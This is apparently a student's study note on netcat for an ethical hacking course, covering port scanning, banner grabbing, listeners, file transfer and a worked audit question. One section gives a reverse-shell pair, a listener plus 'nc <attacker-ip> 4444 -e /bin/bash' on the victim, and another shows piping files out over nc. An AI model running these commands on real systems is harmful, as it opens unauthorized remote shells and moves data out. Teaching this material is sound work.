# 🔌 Netcat - Complete Guide

> **MOC:** [[MOC - Tools]] | **Tags:** `#netcat` `#scanning` `#tools` `#banner-grabbing`
> Related: [[Nmap - Complete Guide]], [[Scanning in Ethical Hacking]]

---

## What is Netcat?

**Netcat (nc)** is a versatile networking tool described as the "Swiss Army Knife" of networking. It reads and writes data across network connections using TCP or UDP.

**Key capabilities:**
- Port scanning
- **Banner grabbing** (identifying services)
- File transfer
- Creating listeners / reverse shells
- Chat connections
- Relaying connections

---

## Basic Syntax

```bash
nc [options] <host> <port>
```

---

## Core Commands

### Port Scanning
```bash
# Scan single port
nc -v 192.168.1.1 80

# Scan port range (-z = zero I/O mode, just scan)
nc -zv 192.168.1.1 20 100

# Scan range of ports (port 20 to 100)
nc -zv 192.168.1.1 20-100
```

### Banner Grabbing
```bash
# Connect and grab banner
nc -v 192.168.1.1 80
nc -v 192.168.1.1 22

# With timeout
nc -v -w 3 192.168.1.1 80
```

### Create a Listener
```bash
# Listen on port 4444
nc -lvp 4444

# Listen and save to file
nc -lvp 4444 > output.txt
```

### Connect to Listener
```bash
nc 192.168.1.1 4444
```

### UDP Mode
```bash
nc -u 192.168.1.1 53
```

---

## Key Flags

| Flag | Meaning |
|---|---|
| `-v` | Verbose output |
| `-z` | Zero I/O mode (port scan only) |
| `-l` | Listen mode |
| `-p <port>` | Local port number |
| `-u` | UDP mode (default is TCP) |
| `-w <sec>` | Timeout in seconds |
| `-n` | No DNS resolution |
| `-e <cmd>` | Execute command after connect |

---

## Banner Grabbing (Deep Dive)

**What is banner grabbing?**
Banner grabbing is the process of **connecting to a service and reading the initial message** (banner) it sends. This reveals:
- Service name (e.g., Apache, OpenSSH)
- Service version (e.g., OpenSSH 7.4)
- OS hints
- Configuration details

**Why it's useful in reconnaissance:**
- Identifies **exact software versions** → look up known CVEs
- Reveals **outdated/vulnerable services**
- Helps build attack profile of target
- Passive info after connection — no need for active probing

**Example:**
```bash
nc -v 192.168.1.1 22
# Output: SSH-2.0-OpenSSH_7.4
#         Ubuntu-1ubuntu2.2

nc -v 192.168.1.1 80
# Output: HTTP/1.1 200 OK
#         Server: Apache/2.4.18 (Ubuntu)
```

---

## College Network Scenario (From Your Notes)

**Q: During a security audit of a college network, a student tester uses netcat from a Linux-based machine to check connectivity to a server running on Ubuntu. The tester scans ports 20 to 100 and finds that port 22 and 80 are open. The web service reveals its banner when connected.**

**a) Which netcat feature is being used to identify open ports?**

→ **Port Scanning feature** of Netcat (`-zv` flag)
```bash
nc -zv <server-ip> 20-100
```

**b) What is banner grabbing and why is it useful in reconnaissance?**

→ **Banner grabbing** is the process of connecting to an open service port and reading the initial message (banner) the service sends upon connection. It reveals service name, version, and OS details.

**Useful in reconnaissance because:**
- Identifies exact software versions for CVE lookup
- Reveals outdated/unpatched services
- Builds a complete service profile of the target
- Guides further exploitation attempts

---

## Reverse Shell with Netcat

```bash
# On attacker machine (listener)
nc -lvp 4444

# On victim machine (connect back)
nc <attacker-ip> 4444 -e /bin/bash
```

---

## File Transfer

```bash
# Receiver
nc -lvp 4444 > received_file.txt

# Sender
nc <receiver-ip> 4444 < file_to_send.txt
```

---

## Netcat for Ethical Hacking Workflow

```
Step 1: Use Nmap for broad port scan
    ↓
Step 2: Identify interesting open ports
    ↓
Step 3: Use Netcat to connect & grab banners
    ↓
Step 4: Look up CVEs for identified service versions
    ↓
Step 5: Exploit or report
```

---

## Related Topics
- [[Nmap - Complete Guide]]
- [[hping3 - Packet Crafting]]
- [[Types of Port Scans]]
- [[Banner Grabbing]]
- [[Scanning in Ethical Hacking]]
- [[QA - Netcat Scenarios]]
